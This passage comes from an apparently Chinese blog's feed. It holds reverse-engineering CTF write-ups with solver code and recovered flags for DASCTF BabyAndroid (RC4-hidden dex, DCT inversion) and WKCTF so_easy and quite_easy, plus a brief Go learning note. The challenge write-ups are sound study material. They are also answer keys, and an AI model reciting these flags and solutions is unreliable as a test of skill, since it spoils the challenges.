class="type">int</span> last[<span class="number">10</span>] = &#123;</span><br><span class="line"><span class="number">0xBC2B4DF9</span>, <span class="number">0x6213DD13</span>, <span class="number">0x89FFFCC9</span>, <span class="number">0x0FC94F7D</span>, <span class="number">0x526D1D63</span>, <span class="number">0xE341FD50</span>, <span class="number">0x97287633</span>, <span class="number">0x6BF93638</span>,</span><br><span class="line"><span class="number">0x83143990</span>, <span class="number">0x1F2CE22C</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x12345678</span>, <span class="number">0x09101112</span>, <span class="number">0x13141516</span>, <span class="number">0x15161718</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">8</span>; i &gt; <span class="number">0</span>; i -= <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">last[i] ^= last[<span class="number">0</span>];</span><br><span class="line">last[i + <span class="number">1</span>] ^= last[<span class="number">1</span>];</span><br><span class="line"><span class="built_in">dec</span>(last, key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">dec</span>(last, key);</span><br><span class="line">std::cout &lt;&lt; (<span class="type">char</span>*)last;</span><br><span class="line">&#125;</span><br><span class="line"># DASCTF&#123;I4TH0ok_I5S0ooFunny_Isnotit?????&#125;</span><br></pre></td></tr></table></figure><h2 id="BabyAndroid">BabyAndroid</h2><p>这个题如果没有套娃，我愿夸它，但是出题人知不知道我以为我要解完了结果才是刚刚开始有多么崩溃</p><p>首先题目给了抓包信息</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">charset</span><span class="punctuation">: </span>utf-8</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Dalvik/2.1.0 (Linux; U; Android 11; M2004J7AC Build/RP1A.200720.011)</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>yuanshen.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>413</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">data</span>=TwMkYUkg4bYsY0hL99ggYWnVjWyXQrWAdNmToB0eBXbS6wBzL6ktorjNWI9VOroTU4HgIUYyzGLpcHzd1zNGT+bFZZI7IoxJwpcgXfdwW1LSmiNSP+PuSUsqAzNclF1nJ07b4tYyLWg0zTypbzWsLhOIM+<span class="number">6</span>uci3RFZLREUCALafi01M8mS+KMNxX1Pyn8mSP+KKKjQ5S5fasHRSn+L9qBFws0mWavpfI0QEiMgarxv0iGhYU8cfgonWyL70RvoXET5VUDP1vfYWIBLzzzaAqLC0OiMtUK3TTATSU7yijdgXm18OKMcGIke/NZIM6Sr5fL3t6psDOOkw2C/<span class="number">5</span>uYrJVPn+D6U9KTL64bgREppDqMOvhvbhtuf/S3ASW/+rhtPMtoaD8FxDg0wWSLZA53fQfNA==</span></span><br></pre></td></tr></table></figure><p>很明显data就是flag，然后要逆程序</p><p>jadx（原谅我安卓只会jadxQAQ）搜索yuanshen.com找到发送位置</p><p><img src="https://s2.loli.net/2024/07/21/mR4YMlZDWVLO7py.png" alt="image-20240721175844067"></p><p>然后它用反射调用了encrypt方法，没有搜索到，同时也没看到site.qifen.note.ui.Encrypto，然后详细看这段代码，发现它加载了sex.jpg然后解密作为dex，那么查看解密方法，解密dex，发现是rc4，直接复制为文本解密</p><p>然后看加密方式</p><p><img src="https://s2.loli.net/2024/07/22/giLMsU5YJQGAEWk.png" alt="image-20240721180421330"></p><p>得到密钥：0D0D0D0D0D0D0D0D0D0D0D0D0D0D0D0D</p><p>解密数据得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">458</span>.<span class="number">853181</span>,-<span class="number">18</span>.<span class="number">325492</span>,-<span class="number">18</span>.<span class="number">251911</span>,-<span class="number">2</span>.<span class="number">097520</span>,-<span class="number">21</span>.<span class="number">198660</span>,-<span class="number">22</span>.<span class="number">304648</span>,<span class="number">21</span>.<span class="number">103162</span>,-<span class="number">5</span>.<span class="number">786284</span>,-<span class="number">15</span>.<span class="number">248906</span>,<span class="number">15</span>.<span class="number">329286</span>,<span class="number">16</span>.<span class="number">919499</span>,-<span class="number">19</span>.<span class="number">669045</span>,<span class="number">30</span>.<span class="number">928253</span>,-<span class="number">37</span>.<span class="number">588034</span>,-<span class="number">16</span>.<span class="number">593954</span>,-<span class="number">5</span>.<span class="number">505211</span>,<span class="number">3</span>.<span class="number">014744</span>,<span class="number">6</span>.<span class="number">553616</span>,<span class="number">31</span>.<span class="number">131491</span>,<span class="number">16</span>.<span class="number">472500</span>,<span class="number">6</span>.<span class="number">802400</span>,-<span class="number">78</span>.<span class="number">278577</span>,<span class="number">15</span>.<span class="number">280099</span>,<span class="number">3</span>.<span class="number">893073</span>,<span class="number">56</span>.<span class="number">493581</span>,-<span class="number">34</span>.<span class="number">576344</span>,<span class="number">30</span>.<span class="number">146729</span>,<span class="number">4</span>.<span class="number">445671</span>,<span class="number">6</span>.<span class="number">732204</span></span><br></pre></td></tr></table></figure><p>？？？什么玩意</p><p>然后再一看数据传入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">cipher</span> <span class="operator">=</span> (String) checkMethod.invoke(checkerClass.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]), NoteActivity.<span class="built_in">this</span>.sendInit(contentText));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里还有一个sendInit</p><p>一看是个native，apktool解包，ida开</p><p><img src="https://s2.loli.net/2024/07/22/VmuI7E9RPlWzAGN.png" alt="image-20240721181218663"></p><p>可以找到encrypt函数</p><p>这里复制下来网上搜索可以查到，这个算法是DCT2，一维的，搜索可以看到：</p><p><a href="https://zh.wikipedia.org/wiki/%E7%A6%BB%E6%95%A3%E4%BD%99%E5%BC%A6%E5%8F%98%E6%8D%A2">离散余弦变换</a></p><p>但是DCT3并不可以直接逆向DCT2，查了很多资料也没查到</p><p>然后就看着佬的wp复现了</p><p>逆向时，把DCT3的$x_0/2$去掉，然后后面处理相同，</p><p>同时对每个值乘以$\sqrt{\frac{2}{N}}$和$\sqrt{\frac{1}{N}}$也是在DCT2同样的位置处理，代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dct3</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">double</span>&gt;&amp; Y, std::vector&lt;<span class="type">double</span>&gt;&amp; X)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> N = Y.<span class="built_in">size</span>();</span><br><span class="line">X.<span class="built_in">resize</span>(N);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> n = <span class="number">0</span>; n &lt; N; ++n) &#123;</span><br><span class="line"><span class="type">double</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; N; ++k) &#123;</span><br><span class="line"><span class="keyword">if</span> (k == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">sum += Y[k] * std::<span class="built_in">cos</span>(<span class="number">3.14159265</span> * k * (n + <span class="number">0.5</span>) / N) * std::<span class="built_in">sqrt</span>(<span class="number">1.0</span> / N);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">sum += Y[k] * std::<span class="built_in">cos</span>(<span class="number">3.14159265</span> * k * (n + <span class="number">0.5</span>) / N) * std::<span class="built_in">sqrt</span>(<span class="number">2.0</span> / N);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">X[n] = sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">std::vector&lt;<span class="type">double</span>&gt; res = &#123; <span class="number">458.853181</span>,<span class="number">-18.325492</span>,<span class="number">-18.251911</span>,<span class="number">-2.097520</span>,<span class="number">-21.198660</span>,<span class="number">-22.304648</span>,<span class="number">21.103162</span>,<span class="number">-5.786284</span>,</span><br><span class="line"><span class="number">-15.248906</span>,<span class="number">15.329286</span>,<span class="number">16.919499</span>,<span class="number">-19.669045</span>,<span class="number">30.928253</span>,<span class="number">-37.588034</span>,<span class="number">-16.593954</span>,<span class="number">-5.505211</span>,</span><br><span class="line"><span class="number">3.014744</span>,<span class="number">6.553616</span>,<span class="number">31.131491</span>,<span class="number">16.472500</span>,<span class="number">6.802400</span>,<span class="number">-78.278577</span>,<span class="number">15.280099</span>,<span class="number">3.893073</span>,</span><br><span class="line"><span class="number">56.493581</span>,<span class="number">-34.576344</span>,<span class="number">30.146729</span>,<span class="number">4.445671</span>,<span class="number">6.732204</span> &#125;;</span><br><span class="line">std::vector&lt;<span class="type">double</span>&gt; X;</span><br><span class="line"><span class="built_in">dct3</span>(res, X);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">double</span> x : X) &#123;</span><br><span class="line">std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot;,&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> chr = (<span class="type">char</span>)std::<span class="built_in">round</span>(X[i]);</span><br><span class="line">std::cout &lt;&lt; chr;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// DASCTF&#123;Y0u_Ar3Re4lly_H@ck3r!&#125;</span></span><br></pre></td></tr></table></figure><hr><p>补充DCT变换公式（一维）：</p><p><img src="https://s2.loli.net/2024/07/22/VjwTGsU8gbd9Mqr.png" alt="image-20240722132702606"></p><p>逆变换</p><p><img src="https://s2.loli.net/2024/07/22/iSNuvny7QTjHwcE.png" alt="image-20240722132724585"></p><p>就按上面写的那样写就好了</p>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> 汇编 </tag>
            
            <tag> 调试 </tag>
            
            <tag> 套娃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang学习</title>
      <link href="/posts/484c947.html"/>
      <url>/posts/484c947.html</url>
      
        <content type="html"><![CDATA[<p>有点想学开发，这里先开一篇，之后补充</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintf(w, <span class="string">&quot;Hi I love %s!&quot;</span>, r.URL.Path[<span class="number">1</span>:])</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">http.HandleFunc(<span class="string">&quot;/&quot;</span>, handler)</span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个基本的网页</p><p>基本语法：</p><p><a href="https://www.runoob.com/go/go-tutorial.html">Go 语言教程 | 菜鸟教程 (runoob.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 开发 </category>
          
          <category> 语言学习 </category>
          
          <category> golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 语法 </tag>
            
            <tag> 语言 </tag>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WKCTF-RE部分wp</title>
      <link href="/posts/4f799b15.html"/>
      <url>/posts/4f799b15.html</url>
      
        <content type="html"><![CDATA[<h2 id="very-easy-该题未做出">very_easy[该题未做出]</h2><p>根据<a href="https://blog.csdn.net/Pisces50002/article/details/139580346">矩阵杯2024 Re wp 前两题-CSDN博客</a>这篇博客，遇到类似的题需要下载quickJS后在linux系统上make编译，并以</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;quickjs-libc.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> qjsc_size = <span class="number">3881</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span> qjsc[<span class="number">3884</span>] = &#123;</span><br><span class="line">   the_data</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  JSRuntime *rt;</span><br><span class="line">  JSContext *ctx;</span><br><span class="line">  rt = JS_NewRuntime();</span><br><span class="line">  ctx = JS_NewContextRaw(rt);</span><br><span class="line">  JS_SetModuleLoaderFunc(rt, <span class="literal">NULL</span>, js_module_loader, <span class="literal">NULL</span>);</span><br><span class="line">  JS_AddIntrinsicBaseObjects(ctx);</span><br><span class="line">  JS_AddIntrinsicDate(ctx);</span><br><span class="line">  JS_AddIntrinsicEval(ctx);</span><br><span class="line">  JS_AddIntrinsicStringNormalize(ctx);</span><br><span class="line">  JS_AddIntrinsicRegExp(ctx);</span><br><span class="line">  JS_AddIntrinsicJSON(ctx);</span><br><span class="line">  JS_AddIntrinsicProxy(ctx);</span><br><span class="line">  JS_AddIntrinsicMapSet(ctx);</span><br><span class="line">  JS_AddIntrinsicTypedArrays(ctx);</span><br><span class="line">  JS_AddIntrinsicPromise(ctx);</span><br><span class="line">  JS_AddIntrinsicBigInt(ctx);</span><br><span class="line">  js_std_add_helpers(ctx, argc, argv);</span><br><span class="line">  js_std_eval_binary(ctx, qjsc, qjsc_size, <span class="number">0</span>);</span><br><span class="line">  js_std_loop(ctx);</span><br><span class="line">  JS_FreeContext(ctx);</span><br><span class="line">  JS_FreeRuntime(rt);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我编译后报错version 2 expected 67. 然后就放弃了</p><h2 id="so-easy">so_easy</h2><p>一个so的算法逆向</p><p>遇到so可以用多种架构的都看一下，防止某一个反编译出来比较奇怪。</p><p>逻辑大致是这样：</p><p><img src="https://s2.loli.net/2024/07/16/8F51fyzBTO4QNlK.png" alt="image-20240716091801464"></p><p>这种每个都要循环255次的，爆破怕是不现实，所以一定要找到两种操作对结果的不同影响。</p><p>可以发现：</p><p>input最高位为0时（input为正数），仅左移一位，最后0位为0<br>input最高位为1时（input为负数），左移再异或，最后0位为1</p><p>根据这一点来判断大小然后写算法逆向</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">dec</span><span class="params">(<span class="type">long</span> <span class="type">long</span> input)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> loop = <span class="number">0xff</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> last = input;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> mask = <span class="number">1LL</span> &lt;&lt; <span class="number">63</span>;</span><br><span class="line"><span class="type">int</span> check = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (last &amp; <span class="number">1</span>) &#123;</span><br><span class="line">last ^= <span class="number">0x71234EA7D92996F5</span>;</span><br><span class="line">last = ((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)last &gt;&gt; <span class="number">1</span>) | mask;</span><br><span class="line">check++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">last = ((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)last &gt;&gt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loop -= <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (loop);</span><br><span class="line"><span class="keyword">return</span> last;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">encode</span><span class="params">(<span class="type">long</span> <span class="type">long</span> input)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> loop = <span class="number">0xff</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> last = input;</span><br><span class="line"><span class="type">int</span> check = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (last &gt;= <span class="number">0</span>)</span><br><span class="line">last &lt;&lt;= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">last = (last &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x71234EA7D92996F5</span>LL;</span><br><span class="line">loop -= <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (loop);</span><br><span class="line"><span class="keyword">return</span> last;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> enc[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x540A95F0C1BA81AE</span>, <span class="number">0xF8844E52E24A0314</span>, <span class="number">0x09FD988F98143EC9</span>, <span class="number">0x3FC00F01B405AD5E</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">enc[i] = <span class="built_in">dec</span>(enc[i]);</span><br><span class="line">std::cout &lt;&lt; std::hex &lt;&lt; enc[i] &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; (<span class="type">char</span>*)enc &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// WKCTF&#123;2366064af80f669c2cb9519ab&#125;</span></span><br></pre></td></tr></table></figure><h2 id="quite-easy">quite_easy</h2><p>这个题最后连蒙带猜出来了QAQ</p><p>它hook了strcmp函数，在里面做加密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = *(<span class="type">char</span> *)get_byte(j);</span><br><span class="line">  v5 = *(<span class="type">char</span> *)get_byte(j + <span class="number">32</span>) ^ v4;</span><br><span class="line">  v6 = *(_BYTE *)get_byte(j);</span><br><span class="line">  v7 = (_BYTE *)get_byte(j + <span class="number">32</span>);</span><br><span class="line">  sub_4C13E3(~(*v7 &amp; v6) &amp; v5);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( k = <span class="number">16</span>; k &lt; <span class="number">32</span>; ++k )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = *(<span class="type">char</span> *)get_byte(k);</span><br><span class="line">  v9 = *(<span class="type">char</span> *)get_byte(k - <span class="number">16</span>) ^ v8;</span><br><span class="line">  v10 = *(_BYTE *)get_byte(k);</span><br><span class="line">  v11 = (_BYTE *)get_byte(k - <span class="number">16</span>);</span><br><span class="line">  sub_4C13E3(~(*v11 &amp; v10) &amp; v9);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">32</span>; ++m )</span><br><span class="line">&#123;</span><br><span class="line">  v14 = (_BYTE *)get_byte(m);</span><br><span class="line">  *v14 -= *(_BYTE *)(m + a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密大概有这三个，sub_4C13E3专门用来放置内容到output</p><p>前面几个才是加密，这个加密方式当时是猜的，有点抽象，调不动，复现的时候验证了一下发现确实就是它写的那样加密的</p><p>由于调试时可以发现，它把随机生成的16位值拼在flag后面了，所以可以调试得到第一轮的参数，第二轮的参数就是flag的值，然后最后一轮用了传入的第二个字符串，就是那个假flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">last = [<span class="number">0x80</span>, <span class="number">0xD3</span>, <span class="number">0x6F</span>, <span class="number">0xFF</span>, <span class="number">0x15</span>, <span class="number">0x03</span>, <span class="number">0x98</span>, <span class="number">0x8C</span>, <span class="number">0xB4</span>, <span class="number">0x5B</span>, <span class="number">0x96</span>, <span class="number">0xC0</span>, <span class="number">0x59</span>, <span class="number">0xAC</span>, <span class="number">0x18</span>, <span class="number">0xDF</span>, <span class="number">0x2D</span>, <span class="number">0xCE</span>, <span class="number">0x3F</span>, <span class="number">0xFB</span>, <span class="number">0xC4</span>, <span class="number">0xED</span>, <span class="number">0xD8</span>, <span class="number">0xD2</span>, <span class="number">0xA8</span>, <span class="number">0x2D</span>, <span class="number">0xF8</span>, <span class="number">0x23</span>, <span class="number">0x9F</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0xCE</span>]</span><br><span class="line"></span><br><span class="line">mask = [<span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x31</span>, <span class="number">0x64</span>, <span class="number">0x36</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x65</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x31</span>, <span class="number">0x36</span>, <span class="number">0x61</span>, <span class="number">0x33</span>, <span class="number">0x37</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x66</span>, <span class="number">0x30</span>, <span class="number">0x62</span>, <span class="number">0x37</span>, <span class="number">0x61</span>, <span class="number">0x34</span>, <span class="number">0x30</span>, <span class="number">0x7D</span>]</span><br><span class="line">rand = [<span class="number">0xB1</span>, <span class="number">0x74</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0xD6</span>, <span class="number">0x13</span>, <span class="number">0xCC</span>, <span class="number">0x85</span>, <span class="number">0x20</span>, <span class="number">0xA8</span>, <span class="number">0xF4</span>, <span class="number">0x96</span>, <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x7D</span>, <span class="number">0x26</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    last[i]+=mask[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    last[i]^=rand[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>,<span class="number">32</span>):</span><br><span class="line">    last[i]^=last[i-<span class="number">16</span>]</span><br><span class="line">pl(last)</span><br><span class="line"><span class="comment"># WKCTF&#123;08898c40064d1fc4836db94fe&#125;</span></span><br></pre></td></tr></table></figure><p>这里应当先执行第一个解密再执行第二个解密，这样第二轮解密才能用当时异或的值</p>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git基本操作</title>
      <link href="/posts/ab9e1965.html"/>
      <url>/posts/ab9e1965.html</url>
      
